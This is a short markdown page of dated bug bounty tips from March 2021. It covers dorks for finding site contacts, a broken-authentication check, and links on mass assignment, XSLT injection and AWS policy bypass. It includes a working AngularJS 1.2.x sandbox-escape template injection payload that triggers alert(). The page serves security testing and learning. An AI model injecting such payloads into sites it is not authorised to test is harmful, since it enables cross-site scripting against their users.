# Bug Bounty Tips - March 2021

# 📅 01-Mar-2021
## Find Contact details for any sites using this dorks
1. site:site.tld intext:"
@site
.tld"
2. site:site.tld "security" | "admin" | "contact"
3. site:site.tld security.txt
4. /hunter.io
5. check whois for registrar info

## Broken Authentication tip
1. Added user in dashboard made him admin 
2. Remove user and again add same user
**Note :**If user gets admin without promoting then its broken issue.

## Mass Assignment/Auto binding vulnerability
- https://itzone.com.vn/en/article/mass-assignment-vulnerability-and-prevention

![img](https://pbs.twimg.com/media/EvONSJtXUAIQ4Xm?format=jpg&name=small)

# 📅 02-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 60
- [XSLT Injection ](https://twitter.com/harshbothra_/status/1366413262410059777?s=20)

## AngularJS Client-Side Template Injection as XSS payload for 1.2.24-1.2.29
```js
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

# 📅 03-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 61
- [Bypassing AWS Policies](https://twitter.com/harshbothra_/status/1366738335218028545?s=20)
